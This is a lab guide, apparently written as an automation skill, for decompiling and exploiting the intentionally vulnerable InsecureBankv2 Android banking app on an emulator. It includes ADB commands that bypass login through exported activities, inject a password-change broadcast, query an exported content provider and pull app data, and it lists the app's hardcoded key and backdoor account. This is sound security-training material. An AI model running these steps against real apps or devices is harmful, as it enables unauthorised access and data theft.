# Lab 2: Hardcoded Secrets & Exported Components — Automation Skill

## Overview

This skill automates the end-to-end analysis and exploitation of **Exported Android Components** (CWE-927) and **Hardcoded Secrets** (CWE-321/798) in the InsecureBankv2 vulnerable Android application. It combines static analysis via JADX decompilation with dynamic proof-of-concept exploitation via ADB on an Android emulator.

**Target**: `com.android.insecurebankv2` (InsecureBankv2)  
**Category**: Android Security Misconfiguration  
**CWE**: CWE-927, CWE-321, CWE-798, CWE-215, CWE-200, CWE-325  
**OWASP MASVS**: MASVS-PLATFORM-1, MASVS-CRYPTO-1, MASVS-AUTH-1

---

## Prerequisites

| Tool | Purpose | Expected Location |
|------|---------|-------------------|
| Java JDK 17+ | Runtime for JADX | `C:\jdk-17` or `$env:JAVA_HOME` |
| JADX 1.5+ | APK decompilation | `C:\jadx\bin\jadx.bat` |
| Android SDK Platform-Tools | ADB for device interaction | `C:\Users\%USERNAME%\AppData\Local\Android\Sdk\platform-tools\adb.exe` |
| Android Emulator (AVD) | Target device for PoC | Running AVD (e.g., Pixel_8) |

Verify prerequisites:
```powershell
# Check Java
Test-Path "$env:JAVA_HOME\bin\java.exe"

# Check JADX
Test-Path "C:\jadx\bin\jadx.bat"

# Check ADB
$adb = "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe"
& $adb devices

# Check emulator
& "$env:LOCALAPPDATA\Android\Sdk\emulator\emulator.exe" -list-avds
```

---

## Methodology

### Phase 1: Static Analysis (JADX Decompilation)

**Objective**: Decompile the APK and extract AndroidManifest.xml + all Java sources.

```powershell
# Create output directory
New-Item -ItemType Directory -Path "<WORKDIR>\decompiled" -Force

# Set JAVA_HOME and decompile
$env:JAVA_HOME = "C:\jdk-17"
& "C:\jadx\bin\jadx.bat" -d "<WORKDIR>\decompiled" "<PATH_TO_APK>"
```

**Output**: `decompiled/resources/AndroidManifest.xml` and `decompiled/sources/` with all Java sources.

### Phase 1a: AndroidManifest.xml Analysis

**Search pattern 1 — Exported components**:
```powershell
Select-String -Path "<WORKDIR>\decompiled\resources\AndroidManifest.xml" -Pattern 'android:exported="true"'
```

**Document each exported component**:
- Activity (`<activity android:exported="true">`)
- Service (`<service android:exported="true">`)
- BroadcastReceiver (`<receiver android:exported="true">`)
- ContentProvider (`<provider android:exported="true">`)

**Search pattern 2 — Dangerous configurations**:
```powershell
Select-String -Path "<WORKDIR>\decompiled\resources\AndroidManifest.xml" -Pattern '(debuggable|allowBackup)="true"'
```

### Phase 1b: Hardcoded Secrets Discovery

**Search patterns** (run against `decompiled/sources/`):

| Pattern | What it finds | CWE |
|---------|--------------|-----|
| `(password|secret|key|api_key|token)\s*=` | Hardcoded credentials/keys | CWE-321 |
| `byte\[\]\s*\w*\s*=\s*\{[0,\s]+\}` | Null IV vectors | CWE-325 |
| `equals\("devadmin"\)` | Backdoor accounts | CWE-798 |
| `\.getBytes\("UTF-8"\)` near `SecretKeySpec` | Hardcoded crypto keys | CWE-321 |

**Command**:
```powershell
$sources = "<WORKDIR>\decompiled\sources\com\android\insecurebankv2"
Get-ChildItem -LiteralPath $sources -Filter "*.java" | Select-String -Pattern '(password|secret|key|token|admin|pin|aes|encrypt|decrypt|devadmin)' -CaseSensitive:$false
```

**Key files to inspect**:
- `CryptoClass.java` — Encryption/decryption logic, key material
- `DoLogin.java` — Authentication flow, backdoor accounts
- `DoTransfer.java` — Financial transaction logic
- `TrackUserContentProvider.java` — Data leakage via content provider

### Phase 2: Dynamic Exploitation (ADB PoC)

**Objective**: Install the APK on a running emulator and execute real bypass exploits.

#### Step 1: Install APK
```powershell
$adb = "$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe"
& $adb install --bypass-low-target-sdk-block "<PATH_TO_APK>"
```

> Use `--bypass-low-target-sdk-block` for APKs targeting older SDK levels.

#### Step 2: Bypass Authentication (PoC)

For each exported activity, run:
```powershell
# Main dashboard (authentication bypass)
& $adb shell am start -n com.android.insecurebankv2/.PostLogin

# Money transfer
& $adb shell am start -n com.android.insecurebankv2/.DoTransfer

# Change password
& $adb shell am start -n com.android.insecurebankv2/.ChangePassword

# View bank statement
& $adb shell am start -n com.android.insecurebankv2/.ViewStatement
```

#### Step 3: Exploit BroadcastReceiver
```powershell
& $adb shell am broadcast -a theBroadcast `
    -n com.android.insecurebankv2/.MyBroadCastReceiver `
    --es newpass "hacked_password" `
    --es phonenumber "08123456789"
```

#### Step 4: Query Exported ContentProvider
```powershell
& $adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

#### Step 5: Exploit debuggable flag
```powershell
# Access app internal storage
& $adb shell run-as com.android.insecurebankv2 ls /data/data/com.android.insecurebankv2/

# Backup app data (if allowBackup=true)
& $adb backup -f backup.ab com.android.insecurebankv2
```

### Phase 3: Evidence Collection

Capture screenshots and command outputs:

```powershell
$evidence = "<WORKDIR>\evidence"
New-Item -ItemType Directory -Path $evidence -Force

# Screenshot
& $adb exec-out screencap -p > "$evidence\postlogin_bypass.png"

# Save command results
$results = @"
=== Lab 2: Hardcoded Secrets & Exported Components ===
Date: $(Get-Date -Format 'yyyy-MM-dd')
Target: com.android.insecurebankv2

--- Exported Components Found ---
$(Select-String -Path '<WORKDIR>\decompiled\resources\AndroidManifest.xml' -Pattern 'android:exported="true"')

--- Hardcoded Secrets Found ---
$(Select-String -Path '<WORKDIR>\decompiled\sources\com\android\insecurebankv2\CryptoClass.java' -Pattern 'key\s*=')
$(Select-String -Path '<WORKDIR>\decompiled\sources\com\android\insecurebankv2\DoLogin.java' -Pattern 'devadmin')
"@
$results | Out-File "$evidence\findings_summary.txt"
```

---

## Expected Findings Checklist

After running the full automation, you should find:

- [ ] **6 exported components** in AndroidManifest.xml
  - [ ] 4 Activities: PostLogin, DoTransfer, ChangePassword, ViewStatement
  - [ ] 1 ContentProvider: TrackUserContentProvider
  - [ ] 1 BroadcastReceiver: MyBroadCastReceiver
- [ ] **2 hardcoded secrets** in source code
  - [ ] AES key: `"This is the super secret key 123"` (CryptoClass.java:22)
  - [ ] Backdoor account: `"devadmin"` (DoLogin.java:103)
- [ ] **1 weak crypto practice**
  - [ ] IV all zeros: `{0,0,...,0}` (CryptoClass.java:23)
- [ ] **2 dangerous manifest flags**
  - [ ] `android:debuggable="true"`
  - [ ] `android:allowBackup="true"`
- [ ] **4 successful ADB bypasses** (all activities launchable without login)
- [ ] **1 successful broadcast injection** (receiver accepts external broadcasts)

---

## Reporting Template

The final report should follow this structure:

1. **Executive Summary** — One paragraph overview
2. **Findings table** — ID, severity, CWE, status
3. **Per-finding detail** — Description, code evidence, PoC, impact, remediation
4. **Remediation summary** — Table of fixes
5. **Coverage statement** — What was analyzed/tested
6. **Tools used** — Version and paths
7. **Appendices** — Manifest dump, one-liner exploits

---

## Automation Scorecard

| Phase | Step | Automated |
|-------|------|-----------|
| Static | JADX decompilation | Yes (CLI command) |
| Static | Manifest analysis | Yes (grep patterns) |
| Static | Hardcoded secrets search | Yes (grep patterns) |
| Dynamic | APK install | Yes (adb install) |
| Dynamic | Activity bypass | Yes (am start) |
| Dynamic | Broadcast injection | Yes (am broadcast) |
| Dynamic | Screenshot capture | Yes (screencap) |
| Report | Findings documentation | Manual review recommended |

---

## Troubleshooting

| Error | Cause | Fix |
|-------|-------|-----|
| `JAVA_HOME is not set` | Java not configured | Set `$env:JAVA_HOME = "C:\jdk-17"` |
| `INSTALL_FAILED_DEPRECATED_SDK_VERSION` | APK targets old SDK | Add `--bypass-low-target-sdk-block` flag |
| `Could not find provider` | App process not alive | Launch app first: `am start -n .../.LoginActivity` |
| No emulator connected | AVD not running | Start emulator: `emulator -avd Pixel_8` |
| `adb: command not found` | ADB not in PATH | Use full path: `$env:LOCALAPPDATA\Android\Sdk\platform-tools\adb.exe` |

---

## References

- [OWASP Mobile Top 10 (2024): M8 — Security Misconfiguration](https://owasp.org/www-project-mobile-top-10/)
- [CWE-927: Use of Implicit Intent for Sensitive Communication](https://cwe.mitre.org/data/definitions/927.html)
- [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
- [Android Developer: Safer component exporting](https://developer.android.com/privacy-and-security/risks/android-exported)
- [Android-InsecureBankv2](https://github.com/dineshshetty/Android-InsecureBankv2)
